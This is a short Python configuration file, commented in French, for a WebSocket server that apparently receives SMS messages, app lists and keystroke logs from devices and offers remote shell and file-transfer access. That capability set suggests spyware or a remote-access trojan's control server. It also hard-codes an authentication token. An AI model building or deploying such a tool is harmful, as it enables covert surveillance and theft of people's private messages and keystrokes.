"""CONFIGURATION — à ajuster avant lancement."""

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 9090

WEBSOCKET_PING_INTERVAL = 20
WEBSOCKET_PING_TIMEOUT = 10

DATABASE_PATH = "sms_history.db"
ENABLE_PERSISTENCE = True

AUTH_TOKEN = "1X6zYLPLBE2xiSQETMEl0AFevPQ_3au6AvjmRow2HFgghcE4c"

# ---- Protocole ----
PROTOCOL_VERSION = 3
SERVER_CAPS = ("sms", "evt", "app", "shell", "fs")

# ---- Journalisation ----
EVENT_DIR = "logs"
APP_FILE = "app.txt"
APP_LIST_FILE = "app_list.txt"
KEYS_FILE = "keys.txt"
APP_LIST_RETENTION_DAYS = 30
KEYS_MAX_BYTES = 1_048_576
KEYS_MAX_FILES = 10

# ---- Shell / transfert ----
DOWNLOADS_DIR = "downloads"
CMD_TIMEOUT_S = 30.0
DOWNLOAD_TIMEOUT_S = 900.0
CHUNK_BYTES = 32768
MAX_LIST_ENTRIES = 2000
